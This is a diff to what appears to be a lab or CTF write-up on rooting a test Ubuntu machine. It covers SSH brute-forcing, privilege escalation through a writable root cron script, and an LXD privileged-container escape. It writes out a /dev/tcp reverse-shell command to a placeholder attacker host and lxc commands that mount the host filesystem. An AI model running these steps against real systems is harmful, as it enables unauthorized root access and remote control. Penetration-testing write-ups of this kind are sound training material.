@@ -174,7 +174,7 @@ lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
 ftp:x:114:119:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
 ftp-user:x:1001:1001:,,,:/usr/local/apache24/cgi-bin/:/bin/bash
 ```
-Where we can notice the presence of another user `ubuntu`.
+Where we can notice the presence of two interesting users: `ubuntu` and `lxd`
 
 ## 🟠 via SSH 
 Since SSH is enabled, we tried to enumerate SSH users and guess their passwords. To find the SSH username `ubuntu` we have used `-L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt` and for password the command below
@@ -236,49 +236,32 @@ in his `/home` there are some files, maybe useful for privilege escalation later
 ftp-user@ubuntulab:/usr/local/apache24/cgi-bin$ ls
 printenv  printenv.vbs	printenv.wsf  test-cgi
 ```
+The story differs whether we achieved foothold with `ftp-user` or `ubuntu`
+- `ftp-user` has almost no privileges at all (not a sudoer) 
+- `ubuntu` is practically the `root` user with extra steps
+
+We will show below what we've found.
 
 ## 🟢 via Cronjob 
 By checking the `crontab` file, we noticed a particular:
 ```sh
 ftp-user@ubuntulab:/home/ubuntu$ cat /etc/crontab
 
-# /etc/crontab: system-wide crontab
-# Unlike any other crontab you don't have to run the `crontab'
-# command to install the new version when you edit this file
-# and files in /etc/cron.d. These files also have username fields,
-# that none of the other crontabs do.
-
 SHELL=/bin/sh
 PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 
-# Example of job definition:
-# .---------------- minute (0 - 59)
-# |  .------------- hour (0 - 23)
-# |  |  .---------- day of month (1 - 31)
-# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
-# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
-# |  |  |  |  |
-# *  *  *  *  * user-name command to be executed
-17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
-25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
-47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
-52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
-#
-v
 # Health Check Apache Server
 */1 * * * * root /usr/local/apache24/scripts/health_check.sh
 ```
 Last line: it was set to execute the `health-check.sh` script every minute (`*/1 * * * *`) as `root`, but not only... the script in question is writeable by our current `ftp-user`
 
 ```sh
-ftp-user@ubuntulab:/home/ubuntu$ ls -la /usr/local/apache24/scripts/health_check.sh 
-
 -rwxrw-rw- 1 root ftp-user 415 Apr 30 14:07 /usr/local/apache24/scripts/health_check.sh
 ```
 This is a clear vulnerability that we can leverage to obtain privilege escalation: it was enough to inject a reverse shell onto the file, in this case by LotL - Living off the Land technique using `sh`:
 
  ```sh
-ftp-user@ubuntulab:/home/ubuntu$ echo "sh -i >& /dev/tcp/[attacker_ip]/[attacker_port] 0>&1" > /usr/local/apache24/scripts/health_check.sh
+echo "sh -i >& /dev/tcp/[attacker_ip]/[attacker_port] 0>&1" > /usr/local/apache24/scripts/health_check.sh
 ``` 
 Then waiting 1 minute on average for the cron to execute the command and attach to ourselves on the other side on a trusty netcat listener
 ```sh
@@ -311,9 +294,15 @@ root@ubuntulab:/home/ubuntu#
 We are aware that this is a rather trivial path, but we wanted to include it for completeness nontheless, as it's related to the SSH foothold path.
 
 ## 🔴 via LXD
-(manca)
+This path leverages a vulnerability within `lxd`, which involves in mounting the file system with `root` privileges, which requires to be `sudoer`.
 
-# Conclusions
-The following image shows every possible way to exploit the machine we were given
+Now, `ftp-user` is not a sudoer, but `ubuntu` is, therefore we wanted to include this path given the presence of `lxd` within the machine.
 
-(immagine di SaL)
+```sh
+ubuntu@ubuntulab:~$ lxc init ubuntu:16.04 test -c security.privileged=true 
+ubuntu@ubuntulab:~$ lxc config device add test whatever disk source=/ path=/mnt/root recursive=true 
+ubuntu@ubuntulab:~$ lxc start test
+ubuntu@ubuntulab:~$ lxc exec test bash
+
+root@test:~# 
+```
